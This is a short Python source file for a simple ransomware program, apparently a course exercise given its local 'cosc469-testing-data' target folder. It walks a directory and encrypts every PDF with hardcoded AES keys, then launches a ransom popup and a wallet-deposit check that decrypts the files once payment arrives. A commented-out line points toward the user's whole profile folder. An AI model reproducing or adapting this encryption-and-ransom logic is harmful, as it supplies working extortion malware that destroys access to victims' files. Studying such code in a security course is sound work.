from base64 import encode
import os
import threading
from util.AES import aes
from util.checkWallet import CheckWallet
from util.popup import PopUp


a = aes(b'6969696969696969', b'4242424242424242')
def encodeFiles(path):
    for root, _, files in os.walk(path):
        for file in files:
            if file.endswith(".pdf"):
                currentFile = os.path.join(root, file)
                a.encrypt(currentFile)


def decodeFiles(path):
    for root, _, files in os.walk(path):
        for file in files:
            if file.endswith(".pdf"):
                currentFile = os.path.join(root, file)
                a.decrypt(currentFile)

def check():
    cw = CheckWallet()
    if cw.waitForDeposit() == True:
        print("decrypting")
        decodeFiles(path)
    print("Files have been decrypted!")

path = "C:/Users/Neh Patel/Desktop/repos/testing/cosc469-testing-data"
# sha256sum -c hash.sha256
# USERPROFILE = os.environ.get('USERPROFILE')


encodeFiles(path)
print("Files have been encrypted!")
t = threading.Thread(target=check)
t.start()
pu = PopUp()
pu.mainloop()
t.join()
